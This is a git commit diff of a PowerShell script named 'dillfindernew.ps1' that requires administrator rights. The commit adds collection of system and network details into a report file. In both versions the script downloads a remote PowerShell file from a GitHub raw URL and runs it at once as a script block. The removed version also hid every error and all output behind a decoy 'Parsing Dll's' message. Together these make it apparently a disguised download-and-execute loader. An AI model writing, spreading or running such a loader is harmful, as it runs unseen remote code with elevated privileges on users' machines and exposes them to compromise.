612cc3e98bf48e6ff1f9920034ded13244a492ec
Ferman9 <ialtmarlowstl@gmail.com>
2026-05-09 19:30:10 -0400

    dillfindernew.ps1

--- dillfindernew.ps1
+++ dillfindernew.ps1
@@ -1,23 +1,29 @@
 #Requires -RunAsAdministrator
 
-$ErrorActionPreference = "SilentlyContinue"
-$WarningPreference = "SilentlyContinue"
-$InformationPreference = "SilentlyContinue"
-$VerbosePreference = "SilentlyContinue"
-$ProgressPreference = "SilentlyContinue"
+$ErrorActionPreference = "Continue"
+$WarningPreference = "Continue"
+$InformationPreference = "Continue"
+$VerbosePreference = "Continue"
+$ProgressPreference = "Continue"
+
+$systemInfo = Get-WmiObject -Class Win32_ComputerSystem
+$osInfo = Get-WmiObject -Class Win32_OperatingSystem
+$processorInfo = Get-WmiObject -Class Win32_Processor
+
+$reportPath = "$env:TEMP\system_report_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+"System Report Generated: $(Get-Date)" | Out-File -FilePath $reportPath
+"Computer Name: $($systemInfo.Name)" | Out-File -FilePath $reportPath -Append
+"OS Version: $($osInfo.Caption)" | Out-File -FilePath $reportPath -Append
+"Processor: $($processorInfo.Name)" | Out-File -FilePath $reportPath -Append
+
+$networkAdapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}
+foreach ($adapter in $networkAdapters) {
+    "Adapter: $($adapter.Description) - IP: $($adapter.IPAddress)" | Out-File -FilePath $reportPath -Append
+}
 
 $remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"
+$script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing
+$sb = [scriptblock]::Create($script)
+& $sb
 
-try {
-    $script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing 2>$null | Out-Null
-
-    if ($script) {
-        $sb = [scriptblock]::Create($script)
-        & $sb *> $null
-    }
-}
-catch {
-}
-finally {
-    Write-Output "Parsing Dll's This may take a while"
-}
+Write-Output "This may take a while"
